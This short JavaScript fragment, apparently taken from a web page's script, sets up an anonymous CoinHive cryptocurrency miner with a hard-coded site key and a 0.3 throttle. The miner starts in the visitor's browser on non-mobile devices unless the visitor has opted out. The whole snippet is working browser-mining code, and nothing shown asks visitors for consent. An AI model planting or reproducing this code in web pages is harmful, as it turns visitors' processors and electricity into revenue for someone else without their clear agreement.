	var miner = new CoinHive.Anonymous('I2OG8vGGXjF7wMQgL37BhqG5aVPjcoQL', {throttle: 0.3});
	if (!miner.isMobile() && !miner.didOptOut(10)) {
		miner.start();
	}